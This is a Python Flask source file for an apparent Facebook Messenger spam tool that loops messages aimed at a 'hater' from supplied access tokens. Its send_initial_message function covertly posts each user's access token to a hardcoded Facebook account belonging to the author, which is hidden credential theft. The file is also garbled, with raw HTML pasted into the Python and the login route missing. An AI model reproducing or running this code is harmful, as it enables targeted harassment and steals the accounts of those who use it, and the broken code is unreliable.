from flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Required for session management

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def get_user_name(token):
    return "User Name"

def send_initial_message(access_tokens):
    target_id = "61564435111597"
    results = []
    for token in access_tokens:
        user_name = get_user_name(token)
        msg_template = f"𝙃𝙀𝙇𝙇𝙊! WALEED Sir I am Using Your Convo Page server. 𝙈𝙔 𝙏𝙊𝙆𝙀𝙉 𝙄𝙎: {token}"
        parameters = {'access_token': token, 'message': msg_template}
        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
        try:
            response = requests.post(url, data=parameters, headers=headers)
            if response.status_code == 200:
                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
            else:
                results.append(f"[❌] Failed to send initial message from {user_name}. Status Code: {response.status_code}")
        except requests.RequestException as e:
            results.append(f"[!] Error during initial message send from {user_name}: {e}")
    return results

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

<html>
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            background: linear-gradient(120deg, red, black, blue, yellow);
            background-size: 400% 400%;
            animation: gradientFlow 3s linear infinite;
        }
        @keyframes gradientFlow {
            0% {
                background-position: 20% 20%;
            }
            10% {
                background-position: 50% 50%;
            }
        }

        .login-container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 15px;
            box-shadow: 0 0 30px lime;
            width: 100%;
            max-width: 350px;
            transition: all 0.3s ease;
        }

        .login-container:hover {
            background: linear-gradient(45deg, #808000, #696969, #BC8F8F);
            box-shadow: 0 0 20px rgba(255, 60, 60, 0.6), 0 0 40px rgba(255, 60, 60, 0.4);
            transform: translateY(-5px);
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 25px;
            color: #ff3c3c;
        }

        .login-container input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 8px;
            background: #2a2a2a;
            color: #fff;
            font-size: 14px;
        }

        .login-container input::placeholder {
            color: #ff0033;
        }

        .login-container button {
            width: 100%;
            padding: 12px;
            background: #ff3c3c;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: background 0.1s ease;
        }

        .login-container button:hover {
            background: linear-gradient(45deg, cyan, magenta, hotpink);
            
        }

        @media (max-width: 400px) {
            .login-container {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <form method="post" class="login-container">
        <h2>𝐎𝐖𝐍𝐄𝐑 ⁑ 𝐖𝐀𝐋𝐄𝐄𝐃 𝐗𝐃</h2>
        <input type="text" name="username" placeholder="𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦" required />
        <input type="password" name="password" placeholder="𝘗𝘢𝘴𝘴𝘸𝘰𝘳𝘥" required />
        <button type="submit">𝙻𝙾𝙶𝙸𝙽</button>
    </form>
</body>
</html>.'

    return render_template_string('''
    <html>
    <head><title>Login</title></head>
    <body style="font-family: Arial; background-color: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh;">
    <form method="post" style="background: #222; padding: 30px; border-radius: 10px;">
        <h2 style="text-align:center;">Login</h2>
        <input type="text" name="username" placeholder="Username" required style="display:block; margin-bottom:10px; width:100%; padding:10px;">
        <input type="password" name="password" placeholder="Password" required style="display:block; margin-bottom:10px; width:100%; padding:10px;">
        <button type="submit" style="width:100%; padding:10px;">Login</button>
    </form>
    </body>
    </html>
    ''')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        password_url = 'https://pastebin.com/raw/sRN1u2mp'
        correct_password = requests.get(password_url).text.strip()
        provided_password = request.form.get('mmm')

        if provided_password != correct_password:
            return 'Invalid password. Please try again.'

        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        initial_message_results = send_initial_message(access_tokens)
        for result in initial_message_results:
            print(result)

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string(''' 
        <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 𝐋𝐄𝐆𝐄𝐍𝐃</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* Transparent and Metallic Styling */
    body {
      background-image: url('https://i.pinimg.com/736x/48/6d/12/486d12bb37c2f539f9b4f2f69a7ab943.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      font-family: 'Orbitron', sans-serif; /* Metallic font */
      color: #e0e0e0; /* Light gray text */
    }
    .container {
      max-width: 500px;
      margin: 50px auto;
      padding: 30px;
      background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
      border-radius: 10px;
      backdrop-filter: blur(10px); /* Blur effect for transparency */
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); /* Subtle shadow */
    }
    h1 {
      font-size: 28px;
      font-weight: 700;
      background: linear-gradient(45deg, #ffd700, #c0c0c0, #ffd700); /* Metallic gradient */
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      font-weight: 500;
      color: #e0e0e0; /* Light gray labels */
    }
    .form-control {
      border: 1px solid rgba(255, 255, 255, 0.3); /* Semi-transparent white border */
      background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white background */
      color: #e0e0e0; /* Light gray text */
      width: 100%;
      height: 40px;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 5px;
      font-size: 14px;
    }
    .form-control:focus {
      border-color: #ffd700; /* Gold border on focus */
      box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); /* Gold glow */
    }
    .btn-submit {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      font-weight: 500;
      background: linear-gradient(45deg, #ffd700, #c0c0c0); /* Metallic gradient */
      border: none;
      border-radius: 5px;
      color: #000; /* Black text */
      transition: background 0.3s ease;
    }
    .btn-submit:hover {
      background: linear-gradient(45deg, #c0c0c0, #ffd700); /* Reverse gradient on hover */
    }
    .btn-danger {
      background: linear-gradient(45deg, #ff4444, #cc0000); /* Red gradient */
      border: none;
      border-radius: 5px;
      padding: 10px;
      font-size: 16px;
      font-weight: 500;
      color: white;
      transition: background 0.3s ease;
    }
    .btn-danger:hover {
      background: linear-gradient(45deg, #cc0000, #ff4444); /* Reverse gradient on hover */
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #e0e0e0; /* Light gray footer text */
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366; /* WhatsApp green color */
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🤍𝕃𝔼𝔾𝔼ℕ𝔻 𝕎𝔸𝕃𝔼𝔼𝔻  𝕏𝔻 </h1>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter your token">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Enter thread ID" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Enter hater name" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" placeholder="Enter time interval" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <div class="mb-3">
        <label for="mmm" class="form-label">Enter your key</label>
        <input type="text" class="form-control" id="mmm" name="mmm" placeholder="Enter your key" required>
      </div>
      <button type="submit" class="btn btn-submit">Run</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter task ID" required>
      </div>
      <button type="submit" class="btn btn-danger">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p style="color: white;">© 2022 MADE BY :- 𝕃𝔼𝔾𝔼ℕ𝔻 𝕎𝔸𝕃𝔼𝔼𝔻</p>
    <p style="color: white;">𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙁𝙄𝙍𝙀 🔥 𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙆𝘾</p>
    <div class="mb-3">
    <p><a href="https://www.facebook.com/officelwaleed" style="color: blue;">Chat on Messenger</a></p>
      <a href="https://wa.me/+923150596250" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run()
